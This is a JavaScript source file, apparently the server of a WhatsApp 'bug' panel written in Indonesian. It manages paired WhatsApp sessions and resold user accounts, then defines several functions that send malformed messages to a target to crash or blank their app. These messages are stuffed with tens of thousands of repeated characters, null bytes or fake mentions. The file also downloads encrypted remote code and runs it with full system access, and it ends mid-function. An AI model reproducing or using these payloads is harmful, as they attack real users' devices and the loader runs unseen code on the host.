// ===== ADD PUBLIC SENDER =====
app.get("/addPublicSender", async (req, res) => {
  const { key, number } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  const role = (user.role || "").toLowerCase();

  if (role !== "mods" && role !== "owner") {
    return res.json({
      valid: false,
      message: "Only mods or owner can add public sender"
    });
  }

  const folder = path.join("xs-sessi", "SenderPublic");

  if (!fs.existsSync(folder)) {
    fs.mkdirSync(folder, { recursive: true });
  }

  const sessionDir = path.join(folder, number);

  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      logger: pino({ level: "silent" }),
      auth: state,
      version
    });

    sock.ev.on("creds.update", saveCreds);

    const code = await sock.requestPairingCode(number);

    return res.json({
      valid: true,
      number,
      pairingCode: code
    });

  } catch (err) {
    console.error(err);
    return res.json({
      valid: false,
      message: err.message
    });
  }
});

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('xs-sessi', user.username, number); 

  if (!fs.existsSync(`xs-sessi/${user.username}`)) fs.mkdirSync(`xs-sessi/${user.username}`, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const vinzzoffc = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  vinzzoffc.ev.on("creds.update", saveCreds);

  vinzzoffc.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await sleep(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!vinzzoffc.authState.creds.registered) {
    await sleep(1000);
    let code = await vinzzoffc.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  } else {
    return res.json({ valid: false, message: "Already registered" });
  }
  } catch (err) {
    console.error("Error in getPairing:", err.message);
    return res.status(500).json({ error: err.message });
  }
});

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["mods", "owner",].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});
// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
        
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator) {
    console.log("[❌ USERADD] Creator tidak ditemukan.");
    return res.json({ valid: true, authorized: false, message: "Unauthorized." });
  }

  const targetRole = (role || "member").toLowerCase();

  // ===== RULE ROLE CREATE =====
  if (creator.role === "mods") {
    if (targetRole !== "member" && targetRole !== "reseller") {
      console.log("[❌ USERADD] Mods tidak boleh membuat role ini.");
      return res.json({
        valid: true,
        authorized: false,
        message: "Mods hanya bisa membuat member atau reseller."
      });
    }
  }

  if (creator.role !== "owner" && creator.role !== "mods") {
    console.log("[❌ USERADD] Role tidak diizinkan.");
    return res.json({
      valid: true,
      authorized: false,
      message: "Role ini tidak memiliki izin membuat user."
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({
      valid: true,
      created: false,
      message: "Username already exists."
    });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    parent: creator.username
  };

  db.push(newUser);
  saveDatabase(db);

  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({
    valid: true,
    authorized: true,
    created: true,
    user: newUser
  });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner",].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa menambah masa aktif maksimal 30 hari." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const parts = data.trim().split('.');
    if (parts.length !== 2) {
      throw new Error("Invalid encrypted data format");
    }
    
    const [ivB64, encryptedB64] = parts;

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

// ======================================= //
// WhatsApp Connect Logic
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "xs-sessi";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Error preparing auth folders:", err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const vinzzoffc = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      vinzzoffc.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = vinzzoffc;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = vinzzoffc;
          } else if (type === "Messenger") {
            mess[sessionName] = vinzzoffc;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const vinzzoffc = activeConnections[sessionName];
    try {
      vinzzoffc.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "xs-sessi";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('xs-sessi', owner, number); 

  if (!fs.existsSync('xs-sessi')) fs.mkdirSync('xs-sessi', { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const vinzzoffc = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  vinzzoffc.ev.on("creds.update", saveCreds);

  vinzzoffc.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await sleep(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = vinzzoffc;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('xs-sessi', owner, `${number}.json`);

try {
  await sleep(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}

async function startUserSessions() {
  try {
    // Ensure base folder exists
    if (!fs.existsSync('xs-sessi')) {
      fs.mkdirSync('xs-sessi', { recursive: true });
    }

    // Ambil semua subfolder dalam xs-sessi
    const subfolders = fs.readdirSync('xs-sessi')
      .map(name => path.join('xs-sessi', name))
      .filter(p => {
        try {
          return fs.lstatSync(p).isDirectory();
        } catch (err) {
          return false;
        }
      });

    console.log(`[DEBUG] Found ${subfolders.length} subfolders inside xs-sessi`);

    for (const folder of subfolders) {
      try {
        const jsonFiles = fs.readdirSync(folder)
          .filter(file => file.endsWith(".json"))
          .map(file => path.join(folder, file));

        console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

        for (const jsonFile of jsonFiles) {
          const sessionName = path.basename(jsonFile, ".json");

          // ✅ Cek apakah session sudah aktif
          if (activeConnections[sessionName]) {
            console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
            continue;
          }

          try {
            console.log(`[START] Connecting session: ${sessionName}`);
            await connectSession(folder, sessionName);
          } catch (err) {
            console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
          }
        }
      } catch (err) {
        console.error(`Error processing folder ${folder}:`, err.message);
      }
    }
  } catch (err) {
    console.error("Error in startUserSessions:", err.message);
  }
}

async function loadPublicSessions() {
  const publicFolder = path.join("xs-sessi", "SenderPublic");

  if (fs.existsSync(publicFolder)) {
    const jsonFiles = fs.readdirSync(publicFolder).filter(f => f.endsWith(".json"));

    for (const file of jsonFiles) {
      const sessionName = path.basename(file, ".json");

      if (!activeConnections[sessionName]) {
        await connectSession(publicFolder, sessionName);
      }
    }
  }
}
function isDeviceAllowed(username, androidId){

 const list = loadKeyList()

 const user = list.find(x=>x.username===username)

 if(!user) return true

 return user.androidId === androidId

}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  try {
    const folderPath = path.join('xs-sessi', subfolderName);
    if (!fs.existsSync(folderPath)) return null;

    const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
    for (const file of jsonFiles) {
      const sessionName = `${path.basename(file, ".json")}`;
      if (activeConnections[sessionName]) {
        return activeConnections[sessionName]; // return socket aktif
      }
    }
    return null; // Tidak ada sesi aktif
  } catch (err) {
    console.error("Error checking active session:", err.message);
    return null;
  }
}

const dbPath = "database.json";

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}

function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

const SESSION_PATH = path.join(__dirname, "xs-sessi");

// ===== FUNGSI GET DEVICE INFO =====
async function getDeviceInfo(androidId, deviceName = "Unknown") {
  return {
    androidId,
    model: deviceName,
    loginTime: new Date().toISOString()
  };
}

// ===== Start Express Server =====
app.listen(3000, () => {
  console.log(`🚀 Server aktif di http://localhost:3000`);
    startUserSessions()
    loadPublicSessions();
});

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

// Kirim notifikasi sebelum restart
setInterval(() => {
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);

setInterval(() => {

  const list = loadKeyList();

  let changed = false;

  for (const s of list) {

    if (Date.now() > s.expires) {
      s.expires = Date.now() + SESSION_DURATION;
      changed = true;
    }

  }

  if (changed) saveKeyList(list);

}, 60000);

//funct
async function blankcuy(vinzzoffc, target) {
  try {
    const msg = {
      groupInviteMessage: {
        groupJid: "1@g.us",
        inviteCode: "ꦽ".repeat(1000),
        inviteExpiration: "99999999999",
        groupName: "XvoludUltra Comunity" + "ꦾ".repeat(2500),
        caption: "XvoludUltra" + "ꦾ".repeat(2000),
   
      },
    };

    await vinzzoffc.relayMessage(target, msg, {
   
    });
  } catch (error) {
    console.error("Gagal mengirim pesan:", error);
  }
}

async function Nukleotix(vinzzoffc, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointCenversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await vinzzoffc.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function CrashUi(vinzzoffc, target) {
  const killer = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "bang𞋯",
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "bang𞋯",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: false,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "bang𞋯" + "ꦾ".repeat(15000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"bang𞋯\",\"sections\":[{\"title\":\"ϟ\",\"rows\":[]}]}",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"️DOCUMENT\",\"flow_id\":\"BY XIAA4YOUUSX\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
              }
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(killer), { userJid: target });
  try {
    await vinzzoffc.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.error("Error in Bug System Ui:", err);
  }
}

async function blankCok(vinzzoffc, target) {
    try {
        const anta = 'ោ៝'.repeat(20000);
        const nyocot = 'ꦾ'.repeat(20000);

        const msg = {
            newsletterAdminInviteMessage: {
                newsletterJid: "1234567891234@newsletter",
                newsletterName: "XVOLUDULTRA!" + "ោ៝".repeat(20000),
                caption: "?XVOLUDULTRA KILL YOU!" + anta + nyocot + "ោ៝".repeat(20000),
                inviteExpiration: "90000",
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                }
            }
        };

        await vinzzoffc.relayMessage(target, msg, {});
        console.log('Pesan berhasil dikirim ke', target);
    } catch (error) {
        console.error('Error:', error);
    }
}

async function X7Dev(vinzzoffc, target) {
    const message = {
        extendedTextMessage: {
            text: "bang? \n kamu kenal Xcovz ga? ",
            previewType: "NONE",
            contextInfo: {
                groupInviteMessage: {
                    groupId: "120363401712858639@g.us",
                    axolotlSenderKeyDistributionMessage: "Mwi4qcX+BhAFGiDmepCnThFnaURMY/XQMtD1Cl5K1vcLlxtddPOaCG5tVyIhBRA+tU7dxeeukT28wQi/XPKiX0LEh++Pn2lXqCrz6dt9"
                },
